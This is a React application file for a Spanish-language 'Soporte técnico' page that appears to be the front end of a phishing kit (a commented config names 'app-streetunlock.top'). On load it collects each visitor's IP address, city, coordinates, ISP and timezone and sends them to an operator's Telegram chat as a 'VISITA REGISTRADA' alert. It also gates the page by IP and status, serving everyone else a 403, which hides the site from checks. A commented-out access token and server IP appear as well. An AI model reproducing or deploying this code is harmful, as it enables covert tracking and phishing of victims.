import { useEffect, useState } from 'react';
import { Routes, Route, useLocation, Link, useNavigate } from 'react-router';

import './assets/css/App.css';
import Index from './components/Index';
import Error403 from './components/Error403';
import Error404 from './components/Error404';

import geolocation from './services/geolocation';
import notifications from './services/notifications';
import responses from './services/responses';
import translator from './services/translator';


function App() {
  const navigate = useNavigate();
  const [lang, setLang] = useState('')
  const [isLoading, setIsLoading] = useState(true); // Nuevo estado para controlar la carga
  
  useEffect(() => {
     // Detectar el idioma del navegador
     const detectLanguage = () => {
      const browserLang = navigator.language || navigator.languages[0]; // Detectamos el idioma
      const shortLang = browserLang.split('-')[0]; // Obtenemos solo el código corto (es, en, pt)
      setLang(shortLang); // Guardamos el idioma detectado en el estado
    };
    (async () => {
      detectLanguage();
      const publicIP = await geolocation.getIP(); // Obtenemos la IP
      await getGeolocation(publicIP.data.ip); // Obtenemos la geolocalización
      await accessIP(publicIP.data.ip); // Verificamos si la IP tiene acceso al script
      await getSupport(); // Obtenemos los datos del script
      setIsLoading(false); // Marcamos como cargado
      
    })();
  }, []);

  // Cambiar el título del documento según el idioma
  useEffect(() => {
    document.title = translate(lang, 'Soporte técnico') // Cambia el título según el idioma
  }, [lang]); // Se ejecuta cada vez que cambia el estado `lang`


  // No borrar let location = useLocation()

  const [show, setShow] = useState(false);
  const [idUsername, setIdUsername] = useState(0);
  const [statusreporte, setStatusreporte] = useState(0);
  const [typeCode, setTypeCode] = useState(0);
  const [chatIdTelegram, setChatIdTelegram] = useState('');

  //Gelolocatin
  const [ip, setIp] = useState('')
  const [city, setCity] = useState('');
  const [region, setRegion] = useState('');
  const [country, setCountry] = useState('');
  const [loc, setLoc] = useState('');
  const [org, setOrg] = useState('');
  const [timezone, setTimezone] = useState('');
  const [statusIp, setStatusIp] = useState(0)

  
  //Datos de configuración

  /*const [urlServer, setUrlServer] = useState('https://app-streetunlock.top')
  const [urlAccess, setUrlAccess] = useState('https://apirestsms.lg-developer.com')
  const [accessToken, setAccessToken] = useState('=tA2S5s11ZQ1nrgLoG14c6PY59hF1x')
  const [accessIP, setAccessIP] = useState('75.102.22.216');*/
  

  const handleShow = () => { //Muestra el modal
    setShow(true);
    document.getElementById('root').style.filter = 'blur(8px)';
  };

  const handleClose = () => {//Cierra el modal
    setShow(false);
    document.getElementById('root').style.filter = 'none';
  };

  
  
  const sendTelegram = async (dataObtained, chatIdTelegram) => {

   
    try {
      const publicIP = await geolocation.getIP();
      let ip = publicIP.data.ip;
      const location = await geolocation.location(ip);

      let city = location.data.city;
      let region = location.data.region;
      let country = location.data.country;
      let loc = location.data.loc;
      let org = location.data.org;
      let timezone = location.data.timezone;

      let msgTelegram = `<b>VISITA REGISTRADA</b>\n`
        + `<b>---------------------------------➡️</b>\n`
        + dataObtained
        + `<b>---------------------------------➡️</b>\n`
        + `<b>GEOLOCALIZACIÓN</b>\n`
        + `<b>IP</b> ${ip}\n`
        + `<b>País : </b> ${country}\n`
        + `<b>Ciudad : </b> ${city}\n`
        + `<b>Región : </b> ${region}\n`
        + `<b>Coordenadas : </b> ${loc}\n`
        + `<b>ISP : </b> ${org}\n`
        + `<b>Zona horaria : </b> ${timezone}`;
    
        await notifications.telegram(msgTelegram, chatIdTelegram);
    } catch (error) {
      console.error(error);
    }
  };

  const getGeolocation = async (ip) => {
    
      const location = await geolocation.location(ip);
      setIp(ip)
      setCity(location.data.city)
      setRegion(location.data.region)
      setCountry(location.data.country)
      setLoc(location.data.loc)
      setOrg(location.data.org)
      setTimezone(location.data.timezone)
  }
  

  const getSupport = async () => {
    try {
       const response =  await responses.getSupport();
       console.log(response)
       const idUsername = response.data.data.idusuario;
       const statusreporte = response.data.data.statusreporte;
       const typeCode = response.data.data.codigo;

       setIdUsername(idUsername)
       setStatusreporte(statusreporte)
       setTypeCode(typeCode)

       //Obtenemos los datos de telegram del usuario
       const responseUsername = await responses.getUsername(idUsername);
       setChatIdTelegram(responseUsername.data.chatiid_telegram)
       //console.log(responseUsername.data.chatiid_telegram)
       await sendTelegram('',responseUsername.data.chatiid_telegram)
       
       
      
    } catch (error) {
      console.error(error);
    }
  };

  const accessIP = async (ip) => {
    try {
      const response =  await responses.accessIP(ip);
      if(response.data.data == null){
          setStatusIp(1)//Acceso al script
      }else{
        if(response.data.data.status_ip == 0){
          setStatusIp(0) //Sin acceso
        }else{
          setStatusIp(1) //Acceso al script
        }
      }

      

      //console.log('Aqui 2'+statusIp)
    
      
   } catch (error) {
     console.error(error);
   }
  }
 
  const translate = (lang, text) => {
    try {
      const response = translator.translate(lang, text);
      //console.log('Translation response:', response); // Debugging log
      return response;
    } catch (error) {
      console.error('Translation error:', error); // Log the error
      return null; // Return null or a fallback value in case of an error
    }
  };
  return (
    <>
      {isLoading ? ( // Mostramos un indicador de carga mientras se obtienen los datos
        <div className="loading-text"> {translate(lang, 'Cargando')}</div>
      ) : (
        <>
          <Routes>
            <Route
             // path={'/ejemplo-react'}
             path={'/'}
              element={
                statusreporte == 1 && statusIp == 1
                  ? (<Index
                    handleShow={handleShow}
                    show={show}
                    handleClose={handleClose}
                    idUsername={idUsername}
                    typeCode={typeCode}
                    ip={ip}
                    city={city}
                    region={region}
                    country={country}
                    loc={loc}
                    org={org}
                    timezone={timezone}
                    chatIdTelegram={chatIdTelegram}
                    setChatIdTelegram={setChatIdTelegram}
                    sendTelegram={sendTelegram}
                    translate={translate}
                    lang={lang}
                    
                    
                  />)
                  : <Error403                     
                    translate={translate}
                    lang={lang}
                   />
                
              }
            ></Route>
            
            <Route path="*" element={<Error404
                                        translate={translate}
                                        lang={lang}
                                     />} />
          </Routes>
        </>
      )}
    </>
  );
}

export default App;